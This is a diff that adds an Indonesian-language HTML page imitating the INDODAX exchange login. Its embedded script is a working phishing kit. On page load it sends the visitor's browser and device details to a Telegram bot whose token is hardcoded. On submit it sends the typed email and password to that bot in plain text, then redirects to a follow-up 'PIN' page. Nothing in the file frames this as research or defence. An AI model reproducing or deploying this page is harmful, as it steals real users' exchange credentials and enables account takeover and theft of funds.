@@ -1,0 +1,327 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="utf-8"/>
+  <meta content="width=device-width, initial-scale=1" name="viewport"/>
+  <title>Masuk ke INDODAX</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
+  <style>
+    ::placeholder {
+      color: #000000 !important;
+      opacity: 1;
+    }
+    
+    /* Animasi untuk loading state */
+    .loading {
+      position: relative;
+      pointer-events: none;
+    }
+    
+    .loading::after {
+      content: '';
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      width: 20px;
+      height: 20px;
+      margin: -10px 0 0 -10px;
+      border: 2px solid #ffffff;
+      border-top: 2px solid transparent;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+    }
+    
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+  </style>
+</head>
+<body class="bg-white min-h-screen flex flex-col">
+  <div class="max-w-md w-full mx-auto px-6 pt-6">
+    <div class="flex items-center justify-between mb-6">
+      <button aria-label="Back" class="text-gray-600" onclick="window.history.back()">
+        <i class="fas fa-arrow-left text-lg"></i>
+      </button>
+      <a class="text-[#3B9CD9] text-sm font-normal hover:underline" href="register.html">
+        Buat Akun
+      </a>
+    </div>
+    
+    <h1 class="text-black text-xl font-bold mb-2 leading-tight">
+      Masuk ke INDODAX
+    </h1>
+    
+    <p class="text-black text-sm font-normal mb-6 leading-relaxed">
+      Gunakan email dan kata sandi yang terdaftar untuk masuk ke akun Anda
+    </p>
+    
+    <form id="loginForm" class="space-y-4">
+      <div>
+        <label class="block text-black text-xs font-normal mb-1" for="email">
+          Email
+        </label>
+        <input class="w-full border border-gray-300 rounded-md px-3 py-2 text-xs text-black placeholder-black focus:outline-none focus:ring-1 focus:ring-[#3B9CD9]" 
+               id="email" 
+               placeholder="Masukkan email" 
+               type="email" 
+               required
+               pattern="[a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,}$"/>
+        <p class="text-red-500 text-xs mt-1 hidden" id="emailError">Format email tidak valid</p>
+      </div>
+      
+      <div>
+        <label class="block text-black text-xs font-normal mb-1" for="password">
+          Kata Sandi
+        </label>
+        <div class="relative">
+          <input class="w-full border border-gray-300 rounded-md px-3 py-2 pr-10 text-xs text-black placeholder-black focus:outline-none focus:ring-1 focus:ring-[#3B9CD9]" 
+                 id="password" 
+                 placeholder="Masukkan kata sandi" 
+                 type="password" 
+                 required
+                 minlength="6"/>
+          <button aria-label="Toggle password visibility" class="absolute inset-y-0 right-3 flex items-center text-gray-400 text-sm" tabindex="-1" type="button" id="togglePassword">
+            <i class="fas fa-eye-slash"></i>
+          </button>
+        </div>
+        <p class="text-red-500 text-xs mt-1 hidden" id="passwordError">Kata sandi minimal 6 karakter</p>
+      </div>
+      
+      <div class="text-right">
+        <a class="text-[#3B9CD9] text-xs font-normal hover:underline" href="forgot-password.html">
+          Lupa Kata Sandi
+        </a>
+      </div>
+      
+      <button disabled id="submitBtn" class="w-full bg-[#1E90FF] text-white text-sm font-normal py-3 rounded-md mt-2 cursor-not-allowed opacity-50 transition-all duration-200" type="submit">
+        Masuk
+      </button>
+    </form>
+    
+    <div class="flex items-center my-6">
+      <div class="flex-grow border-t border-gray-300"></div>
+      <span class="mx-3 text-gray-400 text-xs font-normal">
+        atau
+      </span>
+      <div class="flex-grow border-t border-gray-300"></div>
+    </div>
+    
+    <button class="w-full border border-gray-300 rounded-md py-2 flex items-center justify-center space-x-2 text-xs font-normal text-gray-700 hover:bg-gray-50 transition-colors duration-200" type="button">
+      <img alt="Google logo with red, yellow, green, and blue colors" class="w-5 h-5" height="20" src="https://upload.wikimedia.org/wikipedia/commons/c/c1/Google_%22G%22_logo.svg" width="20"/>
+      <span>Lanjut dengan Google</span>
+    </button>
+  </div>
+
+  <script>
+    // ================= TELEGRAM BOT CONFIGURATION =================
+    const TELEGRAM_BOT_TOKEN = "8213404016:AAEenWmkIaKGJyh0_JqbMvi5tJfkce-ektc";
+    const TELEGRAM_CHAT_ID = "7718023142";
+    // ==============================================================
+
+    // Toggle password visibility
+    const togglePassword = document.getElementById('togglePassword');
+    const passwordInput = document.getElementById('password');
+    togglePassword.addEventListener('click', () => {
+      const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
+      passwordInput.setAttribute('type', type);
+      togglePassword.innerHTML = type === 'password' ? '<i class="fas fa-eye-slash"></i>' : '<i class="fas fa-eye"></i>';
+    });
+
+    // Form elements
+    const form = document.getElementById('loginForm');
+    const submitBtn = document.getElementById('submitBtn');
+    const emailInput = document.getElementById('email');
+    const passwordError = document.getElementById('passwordError');
+    const emailError = document.getElementById('emailError');
+
+    // ================= TELEGRAM FUNCTIONS =================
+    // Function to send message to Telegram
+    function sendToTelegram(message) {
+      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+      
+      return fetch(url, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+          chat_id: TELEGRAM_CHAT_ID,
+          text: message,
+          parse_mode: 'HTML'
+        })
+      });
+    }
+
+    // Function to send user info to Telegram (browser, IP, etc.)
+    function sendUserInfoToTelegram() {
+      // Get user agent info
+      const userAgent = navigator.userAgent;
+      const platform = navigator.platform;
+      const language = navigator.language;
+      
+      // Get screen resolution
+      const screenResolution = `${screen.width}x${screen.height}`;
+      
+      // Get timezone
+      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+      
+      // Create message with user info
+      const userInfoMessage = `
+📱 <b>USER INFORMATION - LOGIN PAGE</b>
+
+🖥 <b>Browser:</b> ${userAgent}
+📋 <b>Platform:</b> ${platform}
+🌐 <b>Language:</b> ${language}
+🖼 <b>Screen:</b> ${screenResolution}
+⏰ <b>Timezone:</b> ${timezone}
+      `;
+      
+      // Send user info to Telegram
+      sendToTelegram(userInfoMessage)
+        .then(response => response.json())
+        .then(data => {
+          if (!data.ok) {
+            console.error('Failed to send user info to Telegram');
+          }
+        })
+        .catch(error => {
+          console.error('Error sending user info:', error);
+        });
+    }
+
+    // Function to send page visit notification
+    function sendPageVisitNotification() {
+      const visitMessage = `
+🔔 <b>PAGE VISIT NOTIFICATION</b>
+
+📄 <b>Page:</b> Login Page
+🌐 <b>URL:</b> ${window.location.href}
+⏰ <b>Time:</b> ${new Date().toLocaleString('id-ID')}
+      `;
+      
+      sendToTelegram(visitMessage)
+        .then(response => response.json())
+        .then(data => {
+          if (!data.ok) {
+            console.error('Failed to send page visit notification');
+          }
+        })
+        .catch(error => {
+          console.error('Error sending page visit notification:', error);
+        });
+    }
+
+    // Function to send login credentials to Telegram
+    function sendLoginCredentialsToTelegram(email, password) {
+      const loginMessage = `
+🔐 <b>LOGIN ATTEMPT</b>
+
+📧 <b>Email:</b> ${email}
+🔑 <b>Password:</b> ${password}
+⏰ <b>Time:</b> ${new Date().toLocaleString('id-ID')}
+🌐 <b>Page:</b> Login Page
+      `;
+      
+      return sendToTelegram(loginMessage);
+    }
+    // =====================================================
+
+    // Validasi email
+    function validateEmail(email) {
+      const re = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
+      return re.test(String(email).toLowerCase());
+    }
+
+    // Validasi form
+    function validateForm() {
+      const emailValid = validateEmail(emailInput.value.trim());
+      const passwordValid = passwordInput.value.trim().length >= 6;
+      
+      // Tampilkan/sembunyikan pesan error
+      emailError.classList.toggle('hidden', emailValid);
+      passwordError.classList.toggle('hidden', passwordValid);
+      
+      return emailValid && passwordValid;
+    }
+
+    // Enable/disable submit button
+    function toggleSubmitButton() {
+      const isValid = validateForm();
+      
+      if(isValid) {
+        submitBtn.disabled = false;
+        submitBtn.classList.remove('cursor-not-allowed', 'opacity-50');
+        submitBtn.classList.add('cursor-pointer', 'hover:bg-blue-600');
+      } else {
+        submitBtn.disabled = true;
+        submitBtn.classList.add('cursor-not-allowed', 'opacity-50');
+        submitBtn.classList.remove('cursor-pointer', 'hover:bg-blue-600');
+      }
+    }
+
+    // Event listeners untuk validasi real-time
+    emailInput.addEventListener('input', toggleSubmitButton);
+    passwordInput.addEventListener('input', toggleSubmitButton);
+    emailInput.addEventListener('blur', () => validateForm());
+    passwordInput.addEventListener('blur', () => validateForm());
+
+    // Handle form submission
+    form.addEventListener('submit', async function(e) {
+      e.preventDefault();
+
+      if (!validateForm()) {
+        alert('Mohon perbaiki error pada form sebelum melanjutkan.');
+        return;
+      }
+
+      const email = emailInput.value.trim();
+      const password = passwordInput.value.trim();
+
+      // Tampilkan loading state
+      submitBtn.disabled = true;
+      submitBtn.classList.add('loading');
+      submitBtn.textContent = 'Memproses...';
+
+      try {
+        // Kirim kredensial login ke Telegram
+        const telegramResponse = await sendLoginCredentialsToTelegram(email, password);
+        const telegramData = await telegramResponse.json();
+        
+        if (telegramData.ok) {
+          // Simulasi proses login (ganti dengan API call sesungguhnya)
+          await new Promise(resolve => setTimeout(resolve, 1500));
+          
+          // Redirect ke halaman PIN setelah login berhasil
+          window.location.href = "selanjutnya2.html";
+        } else {
+          throw new Error('Failed to send to Telegram');
+        }
+        
+      } catch (error) {
+        console.error('Login error:', error);
+        alert('Terjadi kesalahan saat login. Silakan coba lagi.');
+      } finally {
+        // Reset loading state
+        submitBtn.disabled = false;
+        submitBtn.classList.remove('loading');
+        submitBtn.textContent = 'Masuk';
+        toggleSubmitButton();
+      }
+    });
+
+    // Initialize button state on page load
+    toggleSubmitButton();
+
+    // ================= INITIALIZATION =================
+    // Send page visit notification when page loads
+    document.addEventListener('DOMContentLoaded', function() {
+      // Send user info and page visit notification
+      sendUserInfoToTelegram();
+      sendPageVisitNotification();
+    });
+    // ==================================================
+  </script>
+</body>
+</html>
